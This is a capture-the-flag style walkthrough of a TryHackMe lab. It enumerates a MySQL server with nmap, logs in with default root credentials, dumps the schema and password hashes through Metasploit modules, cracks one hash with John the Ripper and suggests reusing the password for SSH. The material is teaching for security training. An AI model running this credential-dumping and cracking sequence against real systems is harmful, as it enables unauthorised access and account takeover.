# Enumerating MySQL Services

This info is based on information from the TryHackMe Learn Plan, the room: https://tryhackme.com/room/networkservices2

Note that this is done with a vulnerable computer. A computer which has different misconfiguration issues that we will explore here.

## What is MySQL?

In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:

* **Database**: A database is simply a persistent, organised collection of structured data

* **RDBMS**: A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.

* **SQL**: MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).

Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.

### How does MySQL work?

MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:

1. MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2. Clients make requests by making specific statements in SQL.
3. The server will respond to the client with whatever information has been requested.

### What runs MySQL?

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

**More Information**:

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:

https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html 

https://www.w3schools.com/php/php_mysql_intro.asp

## When you would begin attacking MySQL

MySQL is likely not going to be the first point of call when getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

## The Scenario

Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the **credentials**: `root:password` while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

## Requirements

You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn't already installed, you can install it using `sudo apt install default-mysql-client`. Don't worry- this won't install the server package on your system- just the client.

Again, we're going to be using Metasploit for this; it's important that you have Metasploit installed, as it is by default on both Kali Linux and Parrot OS.

## Alternatives

As with the previous task, it's worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as nmap's mysql-enum script: https://nmap.org/nsedoc/scripts/mysql-enum.html or https://www.exploit-db.com/exploits/23081. I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.

## Enumerating and attack

In this example, we will assume that we think having some credentials username `root` and password `password`.

Als like always, we start with our information gathering so we will do a nmap scan:

```commandline
# nmap -p- -A 10.10.188.228
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 13:37 CEST
Nmap scan report for 10.10.188.228
Host is up (0.031s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, ConnectWithDatabase, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolOld, LongPassword, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: _\x04!\x19A\x17\x02\x1B\x02\x07E\x16F\x1Fh*N3\x08\x11
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Not valid before: 2020-04-23T10:13:27
|_Not valid after:  2030-04-21T10:13:27
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/1%OT=22%CT=1%CU=31787%PV=Y%DS=2%DC=T%G=Y%TM=610687AB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.36 ms 10.8.0.1
2   30.45 ms 10.10.188.228

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.88 seconds
```

As we can see, we have 2 services running, `ssh` and `mysql`, and we have their version information. We also know this is running on `Ubuntu`.

So let's try log in with user `root` and password `password`:

```commandline
mysql -h 10.10.188.228 -u root -p
```

We see we can log in with our credentials, so let's just exit this: 

```commandline
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> exit
Bye
```

From here we can use Metasploit. Run `msfconsole` in the shell and then do a search for the `mysql_sql module`. `use` that module and list the `options`:

```commandline
msf6 > search mysql_sql

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/admin/mysql/mysql_sql                   normal  No     MySQL SQL Generic Query


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql_sql

msf6 > use 0
msf6 auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as

msf6 auxiliary(admin/mysql/mysql_sql) >
```

We need to set a few variables. But look to the variable SQL which is set to `select version()`.

Set all required variables:

```commandline
set PASSWORD password
set RHOSTS 10.10.188.228
set USERNAME root
```

Run the exploit with the command `run` or `exploit` and this is the result of it:

```commandline
[*] Running module against 10.10.188.228

[*] 10.10.188.228:3306 - Sending statement: 'select version()'...
[*] 10.10.188.228:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
```

We see the version is `5.7.29-0ubuntu0.18.04.1`, nothing new as we got this information already with our `nmap` scan.q But remember that we can adjust the SQL variable and add some other SQL queries.

For example:

```commandline
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
SQL => show databases
msf6 auxiliary(admin/mysql/mysql_sql) > exploit
[*] Running module against 10.10.188.228

[*] 10.10.188.228:3306 - Sending statement: 'show databases'...
[*] 10.10.188.228:3306 -  | information_schema |
[*] 10.10.188.228:3306 -  | mysql |
[*] 10.10.188.228:3306 -  | performance_schema |
[*] 10.10.188.228:3306 -  | sys |
[*] Auxiliary module execution completed
```

What do we know?

Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:

1. MySQL server credentials
2. The version of MySQL running
3. The number of Databases, and their names.

Key Terminology

In order to understand the exploits we're going to use next- we need to understand a few key terms.

Schema:

In MySQL, physically, a schema is synonymous with a database. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user.

Hashes:

Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.

In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently

However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

Lets get cracking.

First let's search for the `mysql_schemadump` module in the `msfconsole` and `use` it, then `set` all required variables:

```commandline
msf6 auxiliary(admin/mysql/mysql_sql) > search mysql_schemadump

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_schemadump                   normal  No     MYSQL Schema Dump


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_schemadump

msf6 auxiliary(admin/mysql/mysql_sql) > use 0
msf6 auxiliary(scanner/mysql/mysql_schemadump) > options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
   PASSWORD                          no        The password for the specified username
   RHOSTS                            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT            3306             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads (max one per host)
   USERNAME                          no        The username to authenticate as

msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set RHOST 10.10.188.228
RHOST => 10.10.188.228
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
USERNAME => root
```

So we should end up with:

```commandline
msf6 auxiliary(scanner/mysql/mysql_schemadump) > options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
   PASSWORD         password         no        The password for the specified username
   RHOSTS           10.10.188.228    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT            3306             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads (max one per host)
   USERNAME         root             no        The username to authenticate as
```

Now we can `run` the `exploit` (with the `run` or `exploit` command and this will dump the tables and column names of the whole database. This can be a long output so I have stripped out a lot of data here to just show some example I show the last 3 tables with their column information:

```commandline
  - TableName: x$waits_by_host_by_latency
    Columns:
    - ColumnName: host
      ColumnType: varchar(60)
    - ColumnName: event
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned
  - TableName: x$waits_by_user_by_latency
    Columns:
    - ColumnName: user
      ColumnType: varchar(32)
    - ColumnName: event
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned
  - TableName: x$waits_global_by_latency
    Columns:
    - ColumnName: events
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned

[*] 10.10.188.228:3306    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We can do better and try to get the hashes. For this `search mysql_hashdump` and we will `use 0`.

```commandline
msf6 auxiliary(scanner/mysql/mysql_schemadump) > search mysql_hashdump

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_hashdump                   normal  No     MYSQL Password Hashdump
   1  auxiliary/analyze/crack_databases                        normal  No     Password Cracker: Databases


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/analyze/crack_databases
```

Show the options we need to set and finally set them. This time I used `setg` to globally set them, so that i don't need to fill them again if we plan to play with another module which has the same variable names.

```commandline
msf6 auxiliary(scanner/mysql/mysql_hashdump) > show options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as

msf6 auxiliary(scanner/mysql/mysql_hashdump) > setg PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_hashdump) > setg RHOSTS 10.10.188.228
RHOSTS => 10.10.188.228
msf6 auxiliary(scanner/mysql/mysql_hashdump) > setg USERNAME root
USERNAME => root
```

Finally, run the exploit:

```commandline
msf6 auxiliary(scanner/mysql/mysql_hashdump) > exploit

[+] 10.10.188.228:3306    - Saving HashString as Loot: root:
[+] 10.10.188.228:3306    - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.188.228:3306    - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.188.228:3306    - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.188.228:3306    - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.188.228:3306    - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.188.228:3306    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We have now the hashes of our users. we are ready to crack them with john. But first, let's save that to a text file.

```commandline
echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > hash.txt
```

So now let's use john to find out the password:
```
┌──(root💀vm-dsktp-kali)-[/home/itchy]
└─# john hash.txt                                                                                                                                          1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Warning: Only 6 candidates left, minimum 8 needed for performance.
Proceeding with incremental:ASCII
doggie           (carl)
1g 0:00:00:00 DONE 3/3 (2021-08-01 14:33) 1.265g/s 2893Kp/s 2893Kc/s 2893KC/s doggie..doggia
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So the MySQL login password of user carl is `doggie`. Password reuse is not only extremely dangerous, but extremely common.

And can guess that we can log in to `ssh carl@10.10.188.228` with the passowrd `doggie` :-D